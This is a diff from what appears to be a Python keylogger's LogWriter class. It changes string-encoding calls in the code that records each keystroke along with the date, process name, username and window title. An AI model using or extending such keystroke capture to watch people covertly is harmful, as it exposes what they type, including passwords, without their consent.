@@ -198,17 +198,17 @@ class LogWriter(threading.Thread):
                 if username is None:
                     username = 'none'
                     
-                eventlisttmp = [time.strftime('%Y%m%d'), # date
-                                time.strftime('%H%M'), # time
-                                self.GetProcessName(event).replace(self.settings['General']['Log File Field Separator'], '[sep_key]'), # process name (full path on windows, just name on linux)
-                                str(event.Window), # window handle
-                                unicode(username, 'latin-1').replace(self.settings['General']['Log File Field Separator'], '[sep_key]'), # username
-                                unicode(event.WindowName, 'latin-1').replace(self.settings['General']['Log File Field Separator'], '[sep_key]')] # window title
+                eventlisttmp = [myutils.to_unicode(time.strftime('%Y%m%d')), # date
+                                myutils.to_unicode(time.strftime('%H%M')), # time
+                                myutils.to_unicode(self.GetProcessName(event)).replace(self.settings['General']['Log File Field Separator'], '[sep_key]'), # process name (full path on windows, just name on linux)
+                                myutils.to_unicode(event.Window), # window handle
+                                myutils.to_unicode(username).replace(self.settings['General']['Log File Field Separator'], '[sep_key]'), # username
+                                myutils.to_unicode(event.WindowName).replace(self.settings['General']['Log File Field Separator'], '[sep_key]')] # window title
                                 
                 if self.settings['General']['Log Key Count'] == True:
-                    eventlisttmp = eventlisttmp + ['1',unicode(self.ParseEventValue(event), 'latin-1')]
+                    eventlisttmp = eventlisttmp + ['1',myutils.to_unicode(self.ParseEventValue(event))]
                 else:
-                    eventlisttmp.append(unicode(self.ParseEventValue(event), 'latin-1'))
+                    eventlisttmp.append(myutils.to_unicode(self.ParseEventValue(event)))
                     
                 if (self.eventlist[:6] == eventlisttmp[:6]) and (self.settings['General']['Limit Keylog Field Size'] == 0 or (len(self.eventlist[-1]) + len(eventlisttmp[-1])) < self.settings['General']['Limit Keylog Field Size']):
                     self.eventlist[-1] = self.eventlist[-1] + eventlisttmp[-1] #append char to log
@@ -263,10 +263,10 @@ class LogWriter(threading.Thread):
         
         if self.eventlist[:7] != range(7):
             try:
-                line = unicode(self.settings['General']['Log File Field Separator'],'latin-1').join(self.eventlist) + "\n"
+                line = myutils.to_unicode(self.settings['General']['Log File Field Separator']).join(self.eventlist) + "\n"
                 self.PrintStuff(line)
             except:
-                self.PrintDebug(str(self.eventlist), sys.exc_info())
+                self.PrintDebug(str(self.eventlist), exc_info=True)
                 pass # let's keep going, even though this doesn't get logged...
                 
 
